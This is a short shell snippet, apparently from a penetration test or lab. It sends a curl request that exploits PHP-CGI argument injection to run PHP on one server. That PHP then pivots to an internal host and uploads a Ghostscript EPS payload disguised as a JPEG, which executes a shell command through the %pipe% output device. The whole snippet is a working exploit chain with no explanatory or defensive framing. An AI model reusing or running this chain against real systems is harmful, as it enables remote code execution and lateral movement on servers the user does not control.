# Upload EPS via raw socket with multipart form data
curl -s -X POST 'http://192.168.100.2/index.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input' \
  -d '<?php
$eps_content = "%!PS\nuserdict /setpagedevice undef\nsave\nlegal\n{ null restore } stopped { pop } if\n{ legal } stopped { pop } if\nrestore\nmark /OutputFile (%pipe%id > /tmp/pwned_gs) currentdevice putdeviceprops\n";

$boundary = "----WebKitFormBoundary" . md5(time());
$body = "--$boundary\r\n";
$body .= "Content-Disposition: form-data; name=\"file_upload\"; filename=\"test.jpg\"\r\n";
$body .= "Content-Type: image/jpeg\r\n\r\n";
$body .= $eps_content;
$body .= "\r\n--$boundary--\r\n";

$fp = fsockopen("10.10.1.2", 8080, $errno, $errstr, 5);
if (!$fp) { die("Connect failed: $errno - $errstr"); }

$request = "POST / HTTP/1.0\r\n";
$request .= "Host: 10.10.1.2:8080\r\n";
$request .= "Content-Type: multipart/form-data; boundary=$boundary\r\n";
$request .= "Content-Length: " . strlen($body) . "\r\n";
$request .= "Connection: close\r\n\r\n";
$request .= $body;

fwrite($fp, $request);
$response = "";
while (!feof($fp)) $response .= fread($fp, 4096);
fclose($fp);
echo "Response: $response\n";
?>' 2>&1

